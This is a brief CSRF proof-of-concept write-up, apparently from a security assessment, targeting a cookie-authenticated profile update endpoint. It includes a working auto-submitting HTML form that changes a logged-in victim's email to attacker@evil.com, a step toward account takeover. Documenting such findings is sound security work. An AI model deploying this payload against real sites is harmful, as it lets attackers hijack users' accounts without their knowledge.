# CSRF – Proof of Concept

This proof of concept demonstrates successful exploitation
of the identified CSRF vulnerability.

---

## Target Action

- Endpoint: `/profile/update`
- Method: POST
- Authentication: Cookie-based

---

## Proof of Concept HTML

The following HTML was hosted on an attacker-controlled domain
and visited by an authenticated victim:

```html
<form action="https://target.com/profile/update" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
Result

The request was sent automatically

Authentication cookies were included by the browser

The profile update was processed successfully

This confirms that the application is vulnerable to CSRF.
